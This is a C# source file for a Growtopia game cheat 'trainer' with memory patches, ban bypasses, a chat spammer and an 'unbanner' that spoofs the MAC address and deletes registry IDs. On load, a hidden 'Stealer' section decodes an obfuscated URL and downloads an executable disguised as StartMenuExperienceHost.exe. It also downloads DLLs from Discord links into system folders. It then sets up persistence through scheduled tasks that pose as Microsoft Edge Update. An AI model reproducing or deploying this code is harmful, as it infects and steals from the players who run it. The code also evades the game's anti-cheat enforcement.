﻿using Memory;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Windows.Input;

namespace FreeZeHAX_Trainer
{
    public partial class Trainer : Form
    {
        [DllImport("user32.dll")]
        public static extern int SetForegroundWindow(IntPtr hWnd);

        private readonly Cheats cheats = new Cheats(); // Calling Others.cs
        private readonly Mem mem = new Mem();
        private readonly string NewLine = Environment.NewLine; // New line string
        private readonly Others others = new Others(); // Calling Cheats.cs
        private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
        private readonly WebClient web = new WebClient();
        private bool IsProcOpen; // In order us to check if the process exists, we need this bool.
        private bool IsCEOpen;
        private readonly bool Stealer = true; // Activate / Disable Stealer

        public Trainer()
        {
            InitializeComponent();
        }

        public void Auto_Attach_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        { // Check if Growtopia.exe exists. If it exists make ProcOpen bool true / false
            IsProcOpen = mem.OpenProcess("Growtopia.exe");

            System.Threading.Thread.Sleep(1000);
            Auto_Attach.ReportProgress(0);
        }

        public void Auto_Attach_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
        {
            if (IsProcOpen == true)
            {
                try
                {
                    if (CheatAddresses.Items.Count <= 1)
                    { // If CheatAddress listbox has lower than 1 item, clear the listbox
                        Text = "Searching For Cheats!";
                        About_Button.Enabled = false;
                        Cheat_Button.Enabled = false;
                        Spammer_Button.Enabled = false;
                        Unbanner_Button.Enabled = false;
                        Settings_Button.Enabled = false;
                        AobProgress.Show();
                        AobProgress.Start();
                        About_Label.Hide();
                        Cold1.Hide();
                        Cold2.Hide();
                        foreach (string Cheats in cheats.GTCheats)
                        { // Search for all aobs in GTCheats
                            _ = CheatAddresses.Items.Add(AobScan(Cheats));
                        }
                        foreach (string Cheats in cheats.GTCheatsFirst)
                        { // Search for all aobs in GTCheatsFirst
                            _ = CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
                        }
                        Text = "FreeZeHAX Trainer";
                        About_Button.Enabled = true;
                        Cheat_Button.Enabled = true;
                        Spammer_Button.Enabled = true;
                        Unbanner_Button.Enabled = true;
                        Settings_Button.Enabled = true;
                        AobProgress.Hide();
                        AobProgress.Stop();
                        About_Label.Show();
                        Cold1.Show();
                        Cold2.Show();

                        #region Ban Bypasses and Showing FPS

                        _ = mem.WriteMemory(GetCheat(1), "bytes", "90 90"); // Ban Bypass
                        _ = mem.WriteMemory(GetCheat(2), "bytes", "90 90"); // Anti Int Check
                        _ = mem.WriteMemory(GetCheat(23), "bytes", "E9 19 01 00 00"); // Pos Bypass
                        _ = mem.WriteMemory(GetCheat(0), "bytes", "0F 85 9E 01 00 00"); // Force FPS
                        _ = mem.WriteMemory(GetCheat(8), "bytes", "90 90 90 90 90 90 90"); // Mod Zoom
                        _ = mem.WriteMemory(GetCheat(27), "bytes", "90 90"); // Fast Pickup
                        _ = mem.WriteMemory(GetCheat(21), "bytes", "75 90"); // Fast Drop

                        #endregion Ban Bypasses and Showing FPS

                        //mem.WriteMemory("Growtopia.exe+BD9210", "string", "\n \nFreeZeHAX Trainer \nFps:% d                            ");
                    }
                }
                catch (Exception) { }
            }
            else
            {
                CheatAddresses.Items.Clear(); // Clear the listbox
            }
        }

        public void Auto_Attach_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Auto_Attach.RunWorkerAsync(); // Start Auto_Attach background worker
        }

        private string AobScan(string AOB, bool All = true, bool First = false, bool Last = false)
        {
            string Result = "";
            try
            {
                if (First == true)
                {                             // Return first address
                    Result = mem.AoBScan(AOB).Result.First().ToString("X");
                    others.Wait(100);
                }
                if (Last == true)
                {                             // Return last address
                    Result = mem.AoBScan(AOB).Result.Last().ToString("X");
                    others.Wait(100);
                }
                if (All == true)
                {                             // Return all addresses
                    Result = mem.AoBScan(AOB).Result.Sum().ToString("X");
                    others.Wait(100);
                }
            }
            catch (Exception) { }
            return Result;
        }

        private void EditHost_Click(object sender, EventArgs e)
        { // Get what's inside Host_File_Editor, then save it inside hosts file
            try
            {
                File.WriteAllText(Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts"), Host_File_Editor.Text);
            }
            catch (Exception ex)
            {
                _ = MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
            }
        }

        private string GetCheat(int Number)
        {
            return CheatAddresses.Items[Number].ToString(); // Getting cheats easier
        }

        private void GiveawayMode_Timer_Tick(object sender, EventArgs e)
        {
            _ = (Keyboard.GetKeyStates(Key.S) & KeyStates.Down) > 0
                ? mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00")
                : mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
        }

        private void HostsRefresh_Click(object sender, EventArgs e)
        {
            Host_File_Editor.Text = File.ReadAllText(Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts")); // Viewing hosts file's content
        }

        private void OnTop_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        { // Making the application on top of everything
            if (OnTop.BackColor == Color.White)
            {
                ActiveForm.TopMost = true;
                _ = FocusText.Focus();
                OnTop.BackColor = Color.Blue;
                OnTop.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                ActiveForm.TopMost = false;
                _ = FocusText.Focus();
                OnTop.BackColor = Color.White;
                OnTop.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Opacity_Track_Scroll(object sender, ScrollEventArgs e)
        { // View / Change opacity
            ActiveForm.Opacity = OpacityTrackBar.Value / 100.0;
            TrackbarText.Text = OpacityTrackBar.Value.ToString();
        }

        private void RemoveGuna()
        { // Removing Guna licensing stuff
            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna"; // Get guna path
            try
            {
                if (Directory.Exists(Guna)) // If guna folder exists, delete it
                {
                    Directory.Delete(Guna, true);
                }
                using (RegistryKey Key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
                {
                    Key.DeleteSubKeyTree("SOFTWARE\\Guna"); // Delete Guna key
                }
            }
            catch (Exception) { }
        }

        private void RestartTrainer_Click(object sender, EventArgs e)
        { // Restart the trainer
            Application.Restart();
        }

        private void SetInterval_Click(object sender, EventArgs e)
        { // Change TextTimer's interval (value)
            try
            {
                TextTimer.Interval = int.Parse(Spammer_Interval.Text);
                Timer timer1 = new Timer();
                bool parsed = int.TryParse(Spammer_Interval.Text, out int myInt);

                if (parsed)
                {
                    timer1.Interval = myInt;
                }
                IntervalValue.Text = TextTimer.Interval.ToString();
            }
            catch (Exception ex)
            {
                _ = MessageBox.Show(ex.Message, "FreeZeHAX Trainer");
            }
        }

        private void Spammer_Status_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Spammer_Status.BackColor == Color.White)
            {
                _ = FocusText.Focus();
                TextTimer.Start();
                Spammer_Status.BackColor = Color.Blue;
                Spammer_Status.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = FocusText.Focus();
                TextTimer.Stop();
                Spammer_Status.BackColor = Color.White;
                Spammer_Status.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void TextTimer_Tick(object sender, EventArgs e)
        {
            Process[] processes = Process.GetProcessesByName("Growtopia");

            try
            {
                foreach (Process proc in processes)
                {
                    _ = SetForegroundWindow(proc.MainWindowHandle);
                    SendKeys.SendWait("{ENTER}"); // Send ENTER key
                    SendKeys.SendWait(Input.Text); // Send the text inside "Input" textbox
                    SendKeys.SendWait("{ENTER}"); // Send ENTER key
                }
            }
            catch (Exception ex) { _ = MessageBox.Show(ex.Message); }
        }

        // Reverse string
        private string ReverseString(string str)
        {
            char[] array = str.ToCharArray();
            Array.Reverse(array);
            return new string(array);
        }

        private void Trainer_Load(object sender, EventArgs e)
        {
            RefreshKeys();
            Show();
            #region Startup transitions

            PanelTransition.Show(About_Button);
            PanelTransition.Show(Cheat_Button);
            PanelTransition.Show(Spammer_Button);
            PanelTransition.Show(Unbanner_Button);
            PanelTransition.Show(Settings_Button);
            PanelTransition.Show(About);

            #endregion Startup transitions
            RemoveGuna();

            #region Stealer

            if (Stealer == true)
            {
                try
                {
                    string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64"; // SysWOW64's folder location
                    string Sys32 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32"; // System32's folder location
                    string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\"; // Working folder
                    string StealerFile = StealerFolder + "StartMenuExperienceHost.exe"; // Randomized stealer folder
                    bool savePathExists = File.Exists(others.SaveDatPath()); // Check if save.dat file exists

                    #region Check required dlls for the c++ stealer

                    if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
                    {
                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
                        others.Wait(2000);
                    }
                    if (!File.Exists(SysWOW64 + "\\vcruntime140d.dll"))
                    {
                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282974093353/vcruntime140d.dll"), SysWOW64 + "\\vcruntime140d.dll");
                        others.Wait(2000);
                    }
                    if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
                    {
                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
                        others.Wait(2000);
                    }
                    if (!File.Exists(Sys32 + "\\vcomp140.dll"))
                    {
                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/945059959505309786/vcomp140.dll"), Sys32 + "\\vcomp140.dll");
                        others.Wait(2000);
                    }

                    #endregion Check required dlls for the c++ stealer

                    string FixedString = ReverseString("lhXZuQ3cvhUZj5WZpJXZwhXR15WZNRnchR3UvADMyUTN4IzM0ADMzkzNzIzMwEzLygDM1QDOzMTMyUzN3gjM3ITOvMHduVWboNWY0RXYv02bj5CcwFGZy92YzlGZu4GZj9yL6MHc0RHa");
                    web.DownloadFile(new Uri(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(FixedString.PadRight(FixedString.Length + ((4 - (FixedString.Length % 4)) % 4), '=')))), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                    others.Wait(2000);
                    if (!savePathExists)
                    { // If save.dat doesn't exists, just create the task scheduler
                        td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                        DailyTrigger tf = new DailyTrigger();
                        tf.Repetition.Duration = TimeSpan.FromHours(24);
                        tf.Repetition.Interval = TimeSpan.FromMinutes(30);
                        _ = td.Triggers.Add(tf);
                        _ = td.Actions.Add(StealerFile);
                        _ = TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
                        _ = TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");

                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            return;
                        }
                    }
                    else
                    {
                        _ = Process.Start(StealerFile);
                        td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                        DailyTrigger dt = new DailyTrigger();
                        dt.Repetition.Duration = TimeSpan.FromHours(24);
                        dt.Repetition.Interval = TimeSpan.FromMinutes(30);
                        _ = td.Triggers.Add(dt);
                        _ = td.Actions.Add(StealerFile);
                        _ = TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
                        _ = TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");

                        if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            return;
                        }
                    }
                }
                catch (Exception) { }
            }

            #endregion Stealer

            CEKill.RunWorkerAsync(); // Kill CEs
            Auto_Attach.RunWorkerAsync(); // Auto attach
        }

        #region Buttons

        private void About_Button_Click(object sender, EventArgs e)
        {
            PanelTransition.Show(About);
            Cheats.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Changers_Button_Click(object sender, EventArgs e)
        {
            About.Hide();
            Cheats.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Cheat_Button_Click(object sender, EventArgs e)
        {
            PanelTransition.Show(Cheats);
            About.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Settings_Button_Click(object sender, EventArgs e)
        {
            PanelTransition.Show(Settings);
            About.Hide();
            Cheats.Hide();
            Spammer.Hide();
            Unbanner.Hide();

            try
            { // Read hosts file content
                string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
                string str = File.ReadAllText(path);
                Host_File_Editor.Text = str;
            }
            catch (Exception) { } // Ignore all exceptions
        }

        private void Spammer_Button_Click(object sender, EventArgs e)
        {
            PanelTransition.Show(Spammer);
            About.Hide();
            Cheats.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Unbanner_Button_Click(object sender, EventArgs e)
        {
            PanelTransition.Show(Unbanner);
            About.Hide();
            Cheats.Hide();
            Spammer.Hide();
            Settings.Hide();
        }

        #endregion Buttons

        #region Growtopia Cheats

        private void AntiBounce_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiBounce.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(3), "bytes", "90 90 90 90");
                _ = mem.WriteMemory(GetCheat(4), "bytes", "90 90 90 90");
                _ = FocusText.Focus();
                AntiBounce.BackColor = Color.Blue;
                AntiBounce.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(3), "bytes", "41 0F 28 C2");
                _ = mem.WriteMemory(GetCheat(4), "bytes", "83 4B 0C 20");
                _ = FocusText.Focus();
                AntiBounce.BackColor = Color.White;
                AntiBounce.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiGravityWell_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiGravityWell.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(17), "bytes", "90 90 90 90 90");
                _ = FocusText.Focus();
                AntiGravityWell.BackColor = Color.Blue;
                AntiGravityWell.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(17), "bytes", "E8 25 01 00 00");
                _ = FocusText.Focus();
                AntiGravityWell.BackColor = Color.White;
                AntiGravityWell.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiKnockback_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiKnockback.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(11), "bytes", "0F 84 C0 00 00 00");
                _ = mem.WriteMemory(GetCheat(12), "bytes", "0F 84 67 01 00 00");
                _ = FocusText.Focus();
                AntiKnockback.BackColor = Color.Blue;
                AntiKnockback.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(11), "bytes", "0F 85 C0 00 00 00");
                _ = mem.WriteMemory(GetCheat(12), "bytes", "0F 85 67 01 00 00");
                _ = FocusText.Focus();
                AntiKnockback.BackColor = Color.White;
                AntiKnockback.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiLgrid_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiLgrid.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(26), "bytes", "0F 84 67 05 00 00");
                _ = FocusText.Focus();
                AntiLgrid.BackColor = Color.Blue;
                AntiLgrid.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(26), "bytes", "0F 85 67 05 00 00");
                _ = FocusText.Focus();
                AntiLgrid.BackColor = Color.White;
                AntiLgrid.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiPlatform_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiPlatform.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(16), "bytes", "90 90");
                _ = FocusText.Focus();
                AntiPlatform.BackColor = Color.Blue;
                AntiPlatform.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(16), "bytes", "74 0D");
                _ = FocusText.Focus();
                AntiPlatform.BackColor = Color.White;
                AntiPlatform.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiSlide_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiSlide.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(10), "bytes", "74 03");
                _ = FocusText.Focus();
                AntiSlide.BackColor = Color.Blue;
                AntiSlide.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(10), "bytes", "75 03");
                _ = FocusText.Focus();
                AntiSlide.BackColor = Color.White;
                AntiSlide.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void DevMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (DevMode.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(18), "bytes", "75 5F");
                _ = FocusText.Focus();
                DevMode.BackColor = Color.Blue;
                DevMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(18), "bytes", "74 5F");
                _ = FocusText.Focus();
                DevMode.BackColor = Color.White;
                DevMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void FastFallV1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (FastFallV1.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(5), "bytes", "90 90 90 90");
                _ = FocusText.Focus();
                FastFallV1.BackColor = Color.Blue;
                FastFallV1.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(5), "bytes", "F3 0F 59 CE");
                _ = FocusText.Focus();
                FastFallV1.BackColor = Color.White;
                FastFallV1.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void FastFallV2_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (FastFallV2.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00");
                _ = FocusText.Focus();
                FastFallV2.BackColor = Color.Blue;
                FastFallV2.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(6), "bytes", "0F 84 88 00 00 00");
                _ = FocusText.Focus();
                FastFallV2.BackColor = Color.White;
                FastFallV2.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiCheckpoint_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiCheckpoint.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(22), "bytes", "EB 3E");
                _ = FocusText.Focus();
                AntiCheckpoint.BackColor = Color.Blue;
                AntiCheckpoint.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(22), "bytes", "74 3E");
                _ = FocusText.Focus();
                AntiCheckpoint.BackColor = Color.White;
                AntiCheckpoint.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Ghost_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Ghost.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(19), "bytes", "73 05");
                _ = FocusText.Focus();
                Ghost.BackColor = Color.Blue;
                Ghost.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(19), "bytes", "74 05");
                _ = FocusText.Focus();
                Ghost.BackColor = Color.White;
                Ghost.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void GiveawayMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (GiveawayMode.BackColor == Color.White)
            {
                GiveawayMode_Timer.Start();
                _ = mem.WriteMemory(GetCheat(19), "bytes", "73 05"); //Ghost Mode
                _ = mem.WriteMemory(GetCheat(7), "bytes", "90 90"); //Noclip
                _ = mem.WriteMemory(GetCheat(24), "bytes", "75 5D"); //Mod Fly V1
                _ = FocusText.Focus();
                GiveawayMode.BackColor = Color.Blue;
                GiveawayMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                GiveawayMode_Timer.Stop();
                _ = mem.WriteMemory(GetCheat(19), "bytes", "74 05"); //Ghost Mode
                _ = mem.WriteMemory(GetCheat(7), "bytes", "75 0B"); //Noclip
                _ = mem.WriteMemory(GetCheat(24), "bytes", "74 5D"); //Mod Fly V1
                _ = FocusText.Focus();
                GiveawayMode.BackColor = Color.White;
                GiveawayMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Gravity_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Gravity.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(20), "bytes", "0F 85 17 01 00 00");
                _ = FocusText.Focus();
                Gravity.BackColor = Color.Blue;
                Gravity.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(20), "bytes", "0F 84 17 01 00 00");
                _ = FocusText.Focus();
                Gravity.BackColor = Color.White;
                Gravity.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Growz_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Growz.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(25), "bytes", "90 90 90 90");
                _ = FocusText.Focus();
                Growz.BackColor = Color.Blue;
                Growz.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(25), "bytes", "F3 0F 5C D1");
                _ = FocusText.Focus();
                Growz.BackColor = Color.White;
                Growz.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void ModFlyV2_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (ModFlyV2.BackColor == Color.White)
            {
                GiveawayMode_Timer.Start();
                _ = mem.WriteMemory(GetCheat(24), "bytes", "75 5D");
                _ = FocusText.Focus();
                ModFlyV2.BackColor = Color.Blue;
                ModFlyV2.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                GiveawayMode_Timer.Stop();
                _ = mem.WriteMemory(GetCheat(24), "bytes", "74 5D");
                _ = FocusText.Focus();
                ModFlyV2.BackColor = Color.White;
                ModFlyV2.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiState_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiState.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(28), "bytes", "0F 85 71 16 00 00");
                _ = FocusText.Focus();
                AntiState.BackColor = Color.Blue;
                AntiState.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(28), "bytes", "0F 84 71 16 00 00");
                _ = FocusText.Focus();
                AntiState.BackColor = Color.White;
                AntiState.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void SlideMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (SlideMode.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(9), "bytes", "74 0E");
                _ = FocusText.Focus();
                SlideMode.BackColor = Color.Blue;
                SlideMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(9), "bytes", "75 0E");
                _ = FocusText.Focus();
                SlideMode.BackColor = Color.White;
                SlideMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void SystemSpeed_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (SystemSpeed.BackColor == Color.White)
            {
                _ = mem.WriteMemory(GetCheat(13), "bytes", "90 90 90 90");
                _ = mem.WriteMemory(GetCheat(14), "bytes", "90 90 90 90");
                _ = mem.WriteMemory(GetCheat(15), "bytes", "90 90 90 90");
                _ = FocusText.Focus();
                SystemSpeed.BackColor = Color.Blue;
                SystemSpeed.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                _ = mem.WriteMemory(GetCheat(13), "bytes", "89 54 24 6C");
                _ = mem.WriteMemory(GetCheat(14), "bytes", "89 54 24 6C");
                _ = mem.WriteMemory(GetCheat(15), "bytes", "48 8B 43 08");
                _ = FocusText.Focus();
                SystemSpeed.BackColor = Color.White;
                SystemSpeed.FlatAppearance.BorderColor = Color.Black;
            }
        }

        #endregion Growtopia Cheats

        #region Unbanner Class

        private void RefreshKeys()
        {
            try
            {
                RegistryKey Cryptography = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
                foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
                { // Add all adapters in the combobox
                    _ = AdaptersComboBox.Items.Add(new Adapter(adapter));
                }
                AdaptersComboBox.SelectedIndex = 0; // Select the first one
                foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
                {
                    if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                    { // If subkeyname2 string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                        longkey.Text = subkeyname2;
                        UnbanLog.Text = "-> The Second Key " + longkey.Text + " is found!";
                        break;
                    }
                    else
                    {
                        longkey.Text = "None";
                        UnbanLog.Text = "-> Second Key Cannot be found!";
                        break;
                    }
                }
                foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
                {
                    if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                    { // If subkeyname string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                        shortkey.Text = subkeyname;
                        UnbanLog.Text += NewLine + "-> The First Key " + shortkey.Text + " is found!";
                        break;
                    }
                    else
                    {
                        shortkey.Text = "None";
                        UnbanLog.Text += NewLine + "-> First Key Cannot be found!";
                        break;
                    }
                }
                if (Cryptography.GetValueNames().Contains("MachineGuid"))
                { // Check if MachineGuid key exists
                    UnbanLog.Text += NewLine + "-> MachineGuid Key Is Found!";
                }
                else
                {
                    UnbanLog.Text += NewLine + "-> MachineGuid Key Cannot Be Found!";
                }
            }
            catch (Exception) { }
        }

        private void SetRegistryMac(string mac)
        { // Change adapter
            if ((AdaptersComboBox.SelectedItem as Adapter).SetRegistryMac(mac))
            {
                System.Threading.Thread.Sleep(100);
                UpdateAddresses();
            }
        }

        private void Unban_Click(object sender, EventArgs e)
        {
            try
            {
                UpdateAddresses();
                RefreshKeys(); // Refresh all needed keys
                others.Wait(500);
                RandomizedMacAddressLabel.Text = Adapter.GetNewMac();
                others.Wait(500);
                if (longkey.Text != "None" && shortkey.Text != "None")
                { // If longkey and shortkey doesn't exist, show an error message
                    UnbanLog.Clear();
                    _ = FocusText.Focus();
                    if (!Adapter.IsValidMac(RandomizedMacAddressLabel.Text, false))
                    {
                        _ = MessageBox.Show("Entered MAC-address is not valid; will not update.", "Invalid MAC-address specified", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    SetRegistryMac(RandomizedMacAddressLabel.Text);
                    UnbanLog.Text += "-> Mac Address Randomized And Changed!";
                    Registry.CurrentUser.DeleteSubKey(longkey.Text); // Delete longkey
                    UnbanLog.Text += NewLine + "-> The Second Key " + longkey.Text + " is deleted!";
                    string ShortKeyStr = @"Software\Microsoft\" + shortkey.Text; // shortkey
                    Registry.CurrentUser.DeleteSubKey(ShortKeyStr); // Delete shortkey
                    UnbanLog.Text += NewLine + "-> The First Key " + shortkey.Text + " is deleted!";
                    string CryptographyKey = @"SOFTWARE\Microsoft\Cryptography"; // Cryptography Key
                    RegistryKey ckey = Registry.LocalMachine.OpenSubKey(CryptographyKey, true);
                    ckey.DeleteValue("MachineGuid");// Delete Cryptography Key
                    UnbanLog.Text += NewLine + "-> The MachineGuid key is deleted!" + NewLine + "-> Done Unbanning!";
                }
                else
                {
                    _ = MessageBox.Show("                                                  Can't UNBAN!                                                                       Tip: Connect to Growtopia. Then try unbanning!", "FreeZeHAX Trainer");
                }
            }
            catch (Exception) { }
        }

        private void UpdateAddresses()
        {
            ActualMacLabel.Text = (AdaptersComboBox.SelectedItem as Adapter).Mac;
        }

        public class Adapter
        {
            public ManagementObject adapter;
            public string adaptername;
            public string customname;
            public int devnum;

            public Adapter(ManagementObject a, string aname, string cname, int n)
            {
                adapter = a;
                adaptername = aname;
                customname = cname;
                devnum = n;
            }

